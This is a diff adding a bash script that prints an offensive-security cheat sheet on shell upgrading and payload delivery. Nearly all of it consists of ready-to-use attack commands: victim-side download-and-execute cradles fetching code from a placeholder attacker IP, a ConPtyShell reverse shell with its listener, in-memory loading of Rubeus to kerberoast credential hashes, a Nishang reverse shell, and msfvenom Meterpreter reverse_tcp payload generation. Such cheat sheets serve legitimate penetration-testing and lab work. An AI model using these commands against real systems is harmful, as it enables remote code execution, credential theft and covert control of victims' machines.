@@ -1,0 +1,61 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SHELL — UPGRADE & DELIVERY ───────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linux PTY Upgrade ────────────────────────────────${NC}"
+echo -e "  ${GREEN}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${NC}"
+echo -e "  Note: Then press CTRL+Z"
+echo -e "  ${GREEN}stty raw -echo; fg${NC}                               # restore terminal"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows ConPtyShell ───────────────────────────────${NC}"
+echo -e "  Note: Attacker side"
+echo -e "  ${GREEN}stty raw -echo; (stty size; cat) | nc -lvnp <PORT>${NC}"
+echo -e "  Note: Victim side"
+echo -e "  ${GREEN}powershell iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/conptyshell.ps1')${NC}"
+echo -e "  ${GREEN}Invoke-ConPtyShell <ATTACKER_IP> <PORT>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Download Cradles ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}wget http://<ATTACKER_IP>/file -O /tmp/file${NC}        # Linux wget"
+echo -e "  ${GREEN}curl -o /tmp/file http://<ATTACKER_IP>/file${NC}        # Linux curl"
+echo -e "  ${GREEN}iwr http://<ATTACKER_IP>/file -OutFile 'C:\Temp\file'${NC} # PS iwr"
+echo -e "  ${GREEN}certutil -urlcache -split -f http://<ATTACKER_IP>/file 'C:\Temp\file'${NC}"
+echo -e "  ${GREEN}(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file', 'C:\Temp\file')${NC}"
+echo -e "  ${GREEN}(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/file') | IEX${NC}"
+echo -e "  ${GREEN}bitsadmin /transfer job http://<ATTACKER_IP>/file C:\out${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Load C# DLL In-Memory (PS) ───────────────────────${NC}"
+echo -e "  ${GREEN}\$data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/ClassLibrary1.dll')${NC}"
+echo -e "  ${GREEN}\$assem = [System.Reflection.Assembly]::Load(\$data)${NC}"
+echo -e "  ${GREEN}\$class = \$assem.GetType('ClassLibrary1.Class1')${NC}"
+echo -e "  ${GREEN}\$method = \$class.GetMethod('runner')${NC}"
+echo -e "  ${GREEN}\$method.Invoke(0, \$null)${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Rubeus In-Memory ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}\$data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/Rubeus.exe')${NC}"
+echo -e "  ${GREEN}\$assem = [System.Reflection.Assembly]::Load(\$data)${NC}"
+echo -e "  ${GREEN}[Rubeus.Program]::Main('kerberoast /outfile:hashes.txt'.Split())${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Nishang Reverse Shell ────────────────────────────${NC}"
+echo -e "  ${GREEN}powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<ATTACKER_IP>/shell.ps1')${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Meterpreter Prepend Migrate ──────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 EXITFUNC=Thread prependmigrateprocess=explorer.exe prependmigrate=true -f ps1${NC}"
+echo -e "  ${GREEN}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -o test.elf${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
